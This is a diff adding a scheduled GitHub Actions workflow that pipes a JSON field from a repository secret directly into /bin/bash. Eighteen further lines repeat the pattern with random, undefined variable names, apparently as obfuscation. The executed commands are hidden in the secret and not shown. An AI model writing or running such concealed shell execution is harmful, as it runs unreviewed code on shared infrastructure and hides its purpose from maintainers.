@@ -1,0 +1,36 @@
+name: zhongyanguangheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhongyanguangheng
+        env:
+          ztgg0: ${{ secrets.ztgg0 }}
+        run: |
+          echo $ztgg0 | jq -r .xzxo77 | /bin/bash
+          echo $hbhsw5843 | jq -r .i8150 | /bin/bash
+          echo $pyoq0 | jq -r .ynmnq5 | /bin/bash
+          echo $nh0871 | jq -r .q89 | /bin/bash
+          echo $i4 | jq -r .xjr7725 | /bin/bash
+          echo $wq67092 | jq -r .mu81 | /bin/bash
+          echo $vibn81629 | jq -r .rzvm743 | /bin/bash
+          echo $acvgd28 | jq -r .r85 | /bin/bash
+          echo $wmon313 | jq -r .o117 | /bin/bash
+          echo $kcru609 | jq -r .dhb76209 | /bin/bash
+          echo $tc09 | jq -r .t90 | /bin/bash
+          echo $wbax8739 | jq -r .rfdjh793 | /bin/bash
+          echo $vfv3896 | jq -r .dklp374 | /bin/bash
+          echo $ct97 | jq -r .gfsm2 | /bin/bash
+          echo $vaqbl32 | jq -r .k45 | /bin/bash
+          echo $xqb787 | jq -r .j49067 | /bin/bash
+          echo $jfeav2757 | jq -r .oc39 | /bin/bash
+          echo $rmci36881 | jq -r .ojyvf7933 | /bin/bash
+          echo $trzsx443 | jq -r .iwsu573 | /bin/bash
+
